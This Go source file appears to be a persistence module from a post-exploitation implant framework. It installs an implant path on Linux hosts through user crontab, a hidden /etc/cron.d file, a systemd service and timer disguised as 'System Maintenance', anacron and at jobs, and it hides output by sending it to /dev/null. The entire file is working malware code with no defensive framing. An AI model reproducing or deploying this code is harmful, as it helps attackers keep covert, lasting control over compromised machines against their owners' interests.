package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func init() {
	Register(&Persistence{})
}

type Persistence struct{}

func (p *Persistence) Name() string     { return "persist_cron" }
func (p *Persistence) Category() string { return "persistence" }
func (p *Persistence) Description() string {
	return "Establish persistence via cron, systemd timers, at jobs"
}

func (p *Persistence) Execute(args map[string]string) ([]byte, error) {
	implantPath := args["implant_path"]
	if implantPath == "" {
		implantPath = os.Args[0]
	}

	result := p.establish(implantPath)
	return MarshalJSON(result)
}

type persistResult struct {
	Timestamp string          `json:"timestamp"`
	Methods   []persistMethod `json:"methods"`
	Statuses  []string        `json:"statuses"`
}

type persistMethod struct {
	Type      string `json:"type"`
	Detail    string `json:"detail"`
	Success   bool   `json:"success"`
	Timestamp string `json:"timestamp"`
}

func (p *Persistence) establish(implantPath string) *persistResult {
	r := &persistResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// 1. User crontab
	r.Methods = append(r.Methods, p.setupUserCron(implantPath))

	// 2. System crontab (if root)
	r.Methods = append(r.Methods, p.setupSystemCron(implantPath))

	// 3. Systemd timer (if root)
	r.Methods = append(r.Methods, p.setupSystemd(implantPath))

	// 4. Anacron
	r.Methods = append(r.Methods, p.setupAnacron(implantPath))

	// 5. AT job
	r.Methods = append(r.Methods, p.setupATJob(implantPath))

	// Build status strings
	for _, m := range r.Methods {
		status := fmt.Sprintf("[%s] %s", boolStr(m.Success), m.Detail)
		r.Statuses = append(r.Statuses, status)
	}

	return r
}

func (p *Persistence) setupUserCron(implantPath string) persistMethod {
	m := persistMethod{Type: "user_cron", Timestamp: time.Now().UTC().Format(time.RFC3339)}

	cronLine := fmt.Sprintf("*/5 * * * * %s 2>/dev/null\n", implantPath)

	// Get existing crontab
	existing, _ := exec.Command("crontab", "-l").CombinedOutput()

	newCron := strings.TrimSpace(string(existing))
	if newCron != "" && !strings.HasSuffix(newCron, "\n") {
		newCron += "\n"
	}
	newCron += cronLine

	// Write via crontab
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCron)
	if err := cmd.Run(); err == nil {
		m.Success = true
		m.Detail = fmt.Sprintf("Added cron: %s", strings.TrimSpace(cronLine))
	} else {
		m.Detail = fmt.Sprintf("Failed: %v", err)
	}

	return m
}

func (p *Persistence) setupSystemCron(implantPath string) persistMethod {
	m := persistMethod{Type: "system_cron", Timestamp: time.Now().UTC().Format(time.RFC3339)}

	if os.Geteuid() != 0 {
		m.Detail = "Skipped (not root)"
		return m
	}

	cronFile := "/etc/cron.d/.system-maintenance"
	content := fmt.Sprintf("*/5 * * * * root %s 2>/dev/null\n", implantPath)
	if err := os.WriteFile(cronFile, []byte(content), 0644); err == nil {
		m.Success = true
		m.Detail = fmt.Sprintf("Wrote %s", cronFile)
	} else {
		m.Detail = fmt.Sprintf("Failed: %v", err)
	}

	return m
}

func (p *Persistence) setupSystemd(implantPath string) persistMethod {
	m := persistMethod{Type: "systemd_timer", Timestamp: time.Now().UTC().Format(time.RFC3339)}

	if os.Geteuid() != 0 {
		m.Detail = "Skipped (not root)"
		return m
	}

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, implantPath)

	timerContent := `[Unit]
Description=Run System Maintenance periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min
RandomizedDelaySec=30s

[Install]
WantedBy=timers.target
`

	serviceFile := "/etc/systemd/system/system-maintenance.service"
	timerFile := "/etc/systemd/system/system-maintenance.timer"

	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		m.Detail = fmt.Sprintf("Failed service: %v", err)
		return m
	}
	if err := os.WriteFile(timerFile, []byte(timerContent), 0644); err != nil {
		m.Detail = fmt.Sprintf("Failed timer: %v", err)
		return m
	}

	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "--now", "system-maintenance.timer").Run()

	m.Success = true
	m.Detail = "Systemd timer enabled"
	return m
}

func (p *Persistence) setupAnacron(implantPath string) persistMethod {
	m := persistMethod{Type: "anacron", Timestamp: time.Now().UTC().Format(time.RFC3339)}

	if _, err := os.Stat("/etc/anacrontab"); os.IsNotExist(err) {
		m.Detail = "No anacrontab found"
		return m
	}

	entry := fmt.Sprintf("\n# System maintenance\n1\t5\tsystem.maintenance\t%s 2>/dev/null\n", implantPath)
	f, err := os.OpenFile("/etc/anacrontab", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		m.Detail = fmt.Sprintf("Failed: %v", err)
		return m
	}
	defer f.Close()
	f.WriteString(entry)
	m.Success = true
	m.Detail = "Added anacron entry"
	return m
}

func (p *Persistence) setupATJob(implantPath string) persistMethod {
	m := persistMethod{Type: "at_job", Timestamp: time.Now().UTC().Format(time.RFC3339)}

	at, err := exec.LookPath("at")
	if err != nil {
		m.Detail = "at command not found"
		return m
	}

	cmd := exec.Command(at, "now", "+", "1", "hour")
	cmd.Stdin = strings.NewReader(fmt.Sprintf("%s 2>/dev/null\n", implantPath))
	if err := cmd.Run(); err == nil {
		m.Success = true
		m.Detail = "Scheduled AT job"
	} else {
		m.Detail = fmt.Sprintf("Failed: %v", err)
	}
	return m
}

func boolStr(b bool) string {
	if b {
		return "+"
	}
	return "-"
}
